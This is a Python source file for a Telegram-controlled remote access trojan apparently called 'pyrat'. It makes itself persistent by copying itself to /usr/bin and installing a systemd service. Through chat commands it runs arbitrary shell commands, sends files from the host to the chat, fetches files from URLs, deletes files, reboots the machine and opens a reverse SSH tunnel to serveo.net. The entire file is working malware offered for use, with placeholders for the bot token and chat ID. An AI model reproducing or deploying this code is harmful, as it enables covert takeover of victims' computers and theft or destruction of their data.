#!/usr/bin/python
from shutil import copyfile, copyfileobj, rmtree, move
from sys import argv, path, stdout
from json import loads
from time import strftime, sleep					
import time						
import telepot, requests
from telepot.namedtuple import InlineKeyboardMarkup, InlineKeyboardButton
import os, os.path, platform, ctypes					
import socket										
import getpass										
import collections
import urllib, random

def rand():
	seed = random.randint(100, 500)
	return seed

import pyscreenshot as ImageGrab
token = '' # add your token   
known_ids = [''] # add your chat_id
uname = platform.uname()[1]
filename = argv[0]
filename = filename.replace("./", "")
servicename = "telegram"
version = '2.0'

def makestartup(filename, servicename):   # this is buggy
	cmd1 = "chmod +x " + filename
	cmd2 = "cp " + filename + " /usr/bin/pyrat"
	filename = "pyrat"
	line1 = "echo '[Unit]' > /etc/systemd/system/" + servicename + ".service"
	line2 = "echo 'Description=Starts and stops the daemon' >> /etc/systemd/system/" + servicename + ".service" 
	line3 = "echo '[Service]' >> /etc/systemd/system/" + servicename + ".service" 
	line4 = "echo 'WorkingDirectory=/home' >> /etc/systemd/system/" + servicename + ".service"
	line5 = "echo 'Restart=on-failure' >> /etc/systemd/system/" + servicename + ".service"
	line6 = "echo 'RestartSec=10' >> /etc/systemd/system/" + servicename + ".service"
	line7 = "echo 'ExecStart=/usr/bin/pyrat' >> /etc/systemd/system/" + servicename + ".service"
	line8 = "echo '[Install]' >> /etc/systemd/system/" + servicename + ".service"
	line9 = "echo 'WantedBy=multi-user.target' >> /etc/systemd/system/" + servicename + ".service"
	cmd3 = "systemctl preset " + servicename + ".service"
	os.system(cmd1)
	os.system(cmd2)
	os.system(line1)
	os.system(line2)
	os.system(line3)
	os.system(line4)
	os.system(line5)
	os.system(line6)
	os.system(line7)
	os.system(line8)
	os.system(line9)
	os.system(cmd3)
makestartup(filename, servicename)  # only works on ubuntu/raspbian but not in KALI

def internalIP():
	internal_ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	internal_ip.connect(('google.com', 0))
	return internal_ip.getsockname()[0]	
def checkchat_id(chat_id):
	return len(known_ids) == 0 or str(chat_id) in known_ids
def split_string(n, st):
	lst = ['']
	for i in str(st):
		l = len(lst) - 1
		if len(lst[l]) < n:
			lst[l] += i
		else:
			lst += [i]
	return lst
def send_safe_message(bot, chat_id, message):
	while(1):
		try:
			bot.sendMessage(chat_id, message)
			break
		except:
			pass
def handle(msg):
	chat_id = msg['chat']['id']
	if checkchat_id(chat_id):
		response = ''
		if 'text' in msg:
			command = msg['text']
			if command == '/ifconfig':
				response = ''
				bot.sendChatAction(chat_id, 'typing')
				lines = os.popen('ifconfig')
				for line in lines:
					response += line	
			elif command.startswith('/cd'):
				dir = command.replace('/cd ','')
				try:
					os.chdir(dir)
					response = uname + ': ' + os.getcwd() + '>'
				except:
					response = uname + ': No subfolder matching ' + dir
			
				
			elif command == '/ssh':
				randhostname = uname + str(rand())
				tcmd = "ssh -R " + randhostname + ":22:localhost:22 serveo.net"
				rcmd = tcmd + " &"
				os.system(rcmd)
				response = uname + ": " + "SSH Tunnel created \n" + " ssh -J serveo.net " +  getpass.getuser() + "@" + randhostname
				
				

			elif command.startswith('/wget'):
				url = command.replace('/wget ', '')
				filename = url.split('/')[-1]
				if url.startswith('http') or url.startswith('ftp'):
					urllib.urlretrieve(url, filename)
					response = uname + ': Downloaded '+ filename					
				else:
					response = uname + ': usage:\n /wget http://url.to/file.exe'
			elif command.startswith('/delete'):
				command = command.replace('/delete', '')
				path_file = command.strip()
				try:
					os.remove(path_file)
					response = uname + ': Succesfully removed file'
				except:
					try:
						os.rmdir(path_file)
						response = uname + ': Succesfully removed folder'
					except:
						try:
							shutil.rmtree(path_file)
							response = uname + ': I succesfully removed folder and it\'s files'
						except:
							response = uname + ': I Can not find that file'
			elif command.startswith('/download'):
				bot.sendChatAction(chat_id, 'typing')
				path_file = command.replace('/download', '')
				path_file = path_file[1:]
				if path_file == '':
					response = uname + ': /download /path/to/file.name or /download file.name'
				else:
					bot.sendChatAction(chat_id, 'upload_document')
					try:
						bot.sendDocument(chat_id, open(path_file, 'rb'))
					except:
						response = uname + ': I Could not find ' + path_file			
			elif command.startswith('/cp'):
				command = command.replace('/cp', '')
				command = command.strip()
				if len(command) > 0:
					try:
						file1 = command.split('"')[1];
						file2 = command.split('"')[3];
						copyfile(file1, file2)
						response = 'Files copied succesfully.'
					except Exception as e:
						response = uname + ': Error: \n' + str(e)
				else:
					response = uname + ': Usage: \n/cp "/home/DonaldTrump/porn.jpg" "/home/DonaldTrump/hiddenfile.exe"'
					response += '\n\nDouble-Quotes are needed in both whitespace-containing and not containing path(s)'			
			elif command == '/ip_info':
				bot.sendChatAction(chat_id, 'find_location')
				info = requests.get('http://ipinfo.io').text #json format
				location = (loads(info)['loc']).split(',')
				bot.sendLocation(chat_id, location[0], location[1])
				import string
				import re
				response = uname + ': External IP: ' 
				response += "".join(filter(lambda char: char in string.printable, info))
				response = re.sub('[:,{}\t\"]', '', response)
				response += '\n' + 'Internal IP: ' + '\n\t' + internalIP()
			elif command.startswith('/ls'):
				bot.sendChatAction(chat_id, 'typing')
				command = command.replace('/ls', '')
				command = command.strip()
				files = []
				if len(command) > 0:
					files = os.listdir(command)
				else:
					files = os.listdir(os.getcwd())
				human_readable = ''
				for file in files:
					human_readable += file + '\n'
				response = uname + ":\n" + human_readable
			elif command.startswith('/mv'):
				command = command.replace('/mv', '')
				if len(command) > 0:
					try:
						file1 = command.split('"')[1];
						file2 = command.split('"')[3];
						move(file1, file2)
						response = uname + ': Files moved succesfully.'
					except Exception as e:
						response = uname + ': Error: \n' + str(e)
				else:
					response = uname + ': Usage: \n/mv "/path/to/file.jpg" "/path/to/[file.jpg]"'
					response += '\n\nDouble-Quotes are needed in both whitespace-containing and not containing path(s)'
			elif command == '/pc_info':
				bot.sendChatAction(chat_id, 'typing')
				info = ''
				for pc_info in platform.uname():
					info += '\n' + pc_info
				info += '\n' + 'Username: ' + getpass.getuser()
				response = uname + ': ' + info
			elif command == '/ping':
				response = uname + " running Version " + version 
			elif command == '/pwd':
				response = uname + ': ' + os.getcwd()
			elif command == '/reboot':
				bot.sendChatAction(chat_id, 'typing')
				command = os.popen('reboot now')
				response = uname + ' will be restarted NOW.'
			elif command.startswith('/run'):
				bot.sendChatAction(chat_id, 'typing')
				command = command.replace('/run', '')
				if command == '':
					response = uname + ': /run <Unix Command>'
				else:
					command+= ' &'
					os.popen(command)
					response = uname + ': Executed ' + command.replace('&', '')
			elif command == '/shutdown':
				bot.sendChatAction(chat_id, 'typing')
				command = os.popen('shutdown -t 10 &')
				response = uname + ': Computer will be shutdown in 10 seconds.'				
			elif command.startswith('/to'):
				command = command.replace('/to','')
				if command == '':
					response = uname + ': /to <COMPUTER_1_NAME>, <COMPUTER_2_NAME> /msg_box Message'
				else:
					targets = command[:command.index('/')]
					if uname in targets:
						command = command.replace(targets, '')
						msg = {'text' : command, 'chat' : { 'id' : chat_id }}
						handle(msg)
	
			elif command == '/help':
				functionalities = { '/ifconfig' : '', \
						'/cd':'<target_dir>', \
						'/delete':'<target_file>', \
						'/download':'<target_file>', \
						'/ip_info':'', \
						'/ls':'[target_folder]', \
						'/pc_info':'', \
						'/pwd':'', \
						'/reboot':'', \
						'/run':'<Unix Command>', \
						'/shutdown':'', \
						'/to':'<target_computer>, [other_target_computer]',\
						'/wget':'',\
						'/ssh':'create a ssh tunnel',\
						
						}
				response = "\n".join(command + ' ' + description for command,description in sorted(functionalities.items()))
			else: # redirect to /help
				msg = {'text' : '/help', 'chat' : { 'id' : chat_id }}
				handle(msg)
		else: 
			file_name = ''
			file_id = None
			if 'document' in msg:
				file_name = msg['document']['file_name']
				file_id = msg['document']['file_id']
			elif 'photo' in msg:
				file_time = int(time.time())
				file_id = msg['photo'][1]['file_id']
				file_name = file_id + '.jpg'
			file_path = bot.getFile(file_id=file_id)['file_path']
			link = 'https://api.telegram.org/file/bot' + str(token) + '/' + file_path
			file = (requests.get(link, stream=True)).raw
			with open(hide_folder + '\\' + file_name, 'wb') as out_file:
				copyfileobj(file, out_file)
			response = uname + 'File saved as ' + file_name
		if response != '':
			responses = split_string(4096, response)
			for resp in responses:
				send_safe_message(bot, chat_id, resp)		
bot = telepot.Bot(token)
bot.message_loop(handle)
if len(known_ids) > 0:
	Greetings = uname + " running Version: " + version
	for known_id in known_ids:
		bot.sendMessage(known_id, Greetings)
		send_safe_message(bot, known_id, Greetings)

while 1: 
	time.sleep(1)
